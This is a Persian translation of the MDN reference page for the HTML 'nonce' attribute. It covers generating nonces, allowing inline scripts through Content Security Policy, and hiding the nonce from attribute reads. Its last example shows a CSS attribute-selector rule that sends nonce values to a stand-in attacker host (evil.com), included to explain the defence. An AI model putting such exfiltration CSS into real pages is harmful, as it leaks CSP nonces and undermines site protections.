---
title: "nonce HTML global attribute"
source: "https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Global_attributes/nonce"
translated_by: "n8n + AI"
---

# ویژگی سراسری `nonce` در HTML

**`nonce`** یک [ویژگی سراسری](/en-US/docs/Web/HTML/Reference/Global_attributes) است که یک nonce رمزنگاری‌شده («عددی که فقط یک بار استفاده می‌شود») را در قالب یک ویژگی محتوایی تعریف می‌کند. [سیاست امنیت محتوا (CSP)](/en-US/docs/Web/HTTP/Guides/CSP) می‌تواند از این nonce استفاده کند تا مشخص کند آیا یک درخواست (fetch) برای عنصر موردنظر مجاز است یا خیر.

## توضیحات

ویژگی `nonce` برای مجاز کردن عناصر خاص مفید است؛ مثلاً یک اسکریپت داخلی مشخص یا عنصرهای style خاص. به کمک آن می‌توانید از دستور `unsafe-inline` در CSP اجتناب کنید، زیرا آن دستور اجازه می‌دهد _همه_ اسکریپت‌ها یا استایل‌های داخلی اجرا شوند.

> **نکته:** فقط در مواردی از `nonce` استفاده کنید که چاره‌ای جز استفاده از محتوای اسکریپت یا استایل داخلی ندارید. اگر به `nonce` نیازی نیست، از آن استفاده نکنید. اگر اسکریپت شما ایستا است، می‌توانید به‌جای آن از هش CSP استفاده کنید. (به یادداشت‌های مربوط به [unsafe inline script](/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src#unsafe_inline_script) مراجعه کنید.) همیشه سعی کنید تا جایی که ممکن است از محافظت‌های CSP بهره ببرید و از nonce یا اسکریپت‌های داخلی ناامن اجتناب کنید.

## استفاده از nonce برای مجاز کردن یک عنصر `<script>`

برای مجاز کردن یک اسکریپت داخلی با استفاده از مکانیزم nonce، چند مرحله لازم است:

### تولید مقدار

در سمت وب‌سرور، یک رشته تصادفی که با base64 کدگذاری شده و حداقل ۱۲۸ بیت داده دارد، با یک مولد اعداد تصادفی امن از نظر رمزنگاری تولید کنید. nonce باید هر بار که صفحه بارگذاری می‌شود، متفاوت باشد (nonce فقط یک بار!). برای مثال، در nodejs:

```js
import crypto from "node:crypto";

crypto.randomBytes(16).toString("base64");
// '8IBTHwOdqNKAWeKl7plt8g=='
```

### مجاز کردن اسکریپت داخلی

حالا باید nonce تولیدشده در کد سمت backend خود را برای اسکریپت داخلی‌ای که می‌خواهید مجاز کنید، به کار ببرید:

```html
<script nonce="8IBTHwOdqNKAWeKl7plt8g==">
  // …
</script>
```

### ارسال nonce با هدر CSP

در نهایت، باید مقدار nonce را در یک هدر [`Content-Security-Policy`](/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy) ارسال کنید (با پیشوند `nonce-`):

```http
Content-Security-Policy: script-src 'nonce-8IBTHwOdqNKAWeKl7plt8g=='
```

## دسترسی به nonce و پنهان‌سازی آن

به دلایل امنیتی، ویژگی محتوایی `nonce` پنهان است (یک رشته خالی برمی‌گردد).

```js example-bad
script.getAttribute("nonce"); // returns empty string
```

پراپرتی [`nonce`](/en-US/docs/Web/API/HTMLElement/nonce) تنها راه دسترسی به nonce است:

```js example-good
script.nonce; // returns nonce value
```

پنهان‌سازی nonce به جلوگیری از خروج داده‌های nonce توسط مهاجمان کمک می‌کند؛ مهاجمان می‌توانند از مکانیزم‌هایی که داده‌ها را از ویژگی‌های محتوایی می‌گیرند، به این شکل استفاده کنند:

```css example-bad
script[nonce~="whatever"] {
  background: url("https://evil.com/nonce?whatever");
}
```

## همچنین ببینید

- [`HTMLElement.nonce`](/en-US/docs/Web/API/HTMLElement/nonce)
- [سیاست امنیت محتوا (CSP)](/en-US/docs/Web/HTTP/Guides/CSP)
- CSP: [`script-src`](/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src)